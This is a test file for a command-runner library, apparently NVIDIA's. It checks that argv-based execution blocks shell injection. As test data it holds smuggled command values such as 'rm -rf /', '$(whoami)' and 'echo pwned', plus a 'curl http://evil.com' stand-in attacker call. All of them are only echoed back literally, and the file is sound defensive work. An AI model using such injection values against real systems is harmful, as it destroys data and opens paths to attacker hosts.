// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

import { describe, it, expect } from "vitest";
import { createRequire } from "module";

const require = createRequire(import.meta.url);
const runner = require("../../dist/lib/runner");

describe("runArgv", () => {
  it("executes a simple command and returns result", () => {
    const result = runner.runArgv(["echo", "hello"], { suppressOutput: true });
    expect(result.status).toBe(0);
  });

  it("throws when command is not an array", () => {
    expect(() => runner.runArgv("echo hello")).toThrow(/must be a non-empty array/);
  });

  it("throws when command is an empty array", () => {
    expect(() => runner.runArgv([])).toThrow(/must be a non-empty array/);
  });

  it("returns non-zero status with ignoreError", () => {
    const result = runner.runArgv(["false"], { ignoreError: true, suppressOutput: true });
    expect(result.status).not.toBe(0);
  });

  it("passes extra env vars to the child process", () => {
    const result = runner.runArgv(
      ["bash", "-c", "echo $NEMOCLAW_TEST_VAR"],
      { env: { NEMOCLAW_TEST_VAR: "injection-safe" }, suppressOutput: true },
    );
    expect(result.status).toBe(0);
  });

  it("rejects shell: true to prevent security bypass", () => {
    expect(() => runner.runArgv(["echo", "hi"], { shell: true })).toThrow(
      /shell option is forbidden/,
    );
  });

  it("does not interpret shell metacharacters in arguments", () => {
    // If shell interpretation occurred, $(whoami) would be expanded
    const result = runner.runArgvCapture(
      ["echo", "$(whoami)", "&&", "rm", "-rf", "/"],
      { ignoreError: true },
    );
    // echo receives literal argv — no shell expansion
    expect(result).toContain("$(whoami)");
    expect(result).toContain("&&");
    expect(result).toContain("rm");
  });
});

describe("runArgvCapture", () => {
  it("captures stdout from a simple command", () => {
    const output = runner.runArgvCapture(["echo", "hello world"]);
    expect(output).toBe("hello world");
  });

  it("trims whitespace from output", () => {
    const output = runner.runArgvCapture(["echo", "  trimmed  "]);
    expect(output).toBe("trimmed");
  });

  it("throws when command is not an array", () => {
    expect(() => runner.runArgvCapture("echo hello")).toThrow(/must be a non-empty array/);
  });

  it("returns empty string on failure with ignoreError", () => {
    const output = runner.runArgvCapture(["false"], { ignoreError: true });
    expect(output).toBe("");
  });

  it("throws on failure without ignoreError", () => {
    expect(() => runner.runArgvCapture(["false"])).toThrow();
  });

  it("rejects shell: true to prevent security bypass", () => {
    expect(() => runner.runArgvCapture(["echo", "hi"], { shell: true })).toThrow(
      /shell option is forbidden/,
    );
  });

  it("prevents shell injection via argument values", () => {
    // Dangerous sandbox name that would cause injection with shell strings
    const maliciousName = 'alpha"; rm -rf / #';
    const output = runner.runArgvCapture(["echo", maliciousName]);
    // With argv, the string is passed literally — no shell interpretation
    expect(output).toBe(maliciousName);
  });

  it("prevents injection via dollar-sign expansion", () => {
    const output = runner.runArgvCapture(["echo", "${HOME}"]);
    // Literal ${HOME}, not expanded
    expect(output).toBe("${HOME}");
  });

  it("prevents injection via backtick expansion", () => {
    const output = runner.runArgvCapture(["echo", "`whoami`"]);
    // Literal backticks, not expanded
    expect(output).toBe("`whoami`");
  });

  it("handles arguments with spaces and special characters", () => {
    const output = runner.runArgvCapture(["echo", "hello world", "foo bar"]);
    expect(output).toBe("hello world foo bar");
  });

  it("passes extra env to the child process", () => {
    const output = runner.runArgvCapture(
      ["bash", "-c", "echo $TEST_ARGV_ENV"],
      { env: { TEST_ARGV_ENV: "captured" } },
    );
    expect(output).toBe("captured");
  });
});

describe("shell injection regression tests", () => {
  it("sandbox names with shell metacharacters are safe with runArgv", () => {
    // These names would cause injection if passed through bash -c
    const dangerousNames = [
      'my-sandbox; rm -rf /',
      'test$(whoami)',
      'sandbox`id`',
      "sandbox' || echo pwned",
      'sandbox" && echo pwned',
      'sandbox\necho pwned',
    ];

    for (const name of dangerousNames) {
      const output = runner.runArgvCapture(["echo", name], { ignoreError: true });
      // Each name should be passed literally, not interpreted
      expect(output).toContain(name.split("\n")[0]);
    }
  });

  it("model names with shell metacharacters are safe with runArgvCapture", () => {
    const output = runner.runArgvCapture(
      ["echo", 'nvidia/model;curl http://evil.com'],
    );
    expect(output).toBe('nvidia/model;curl http://evil.com');
  });
});
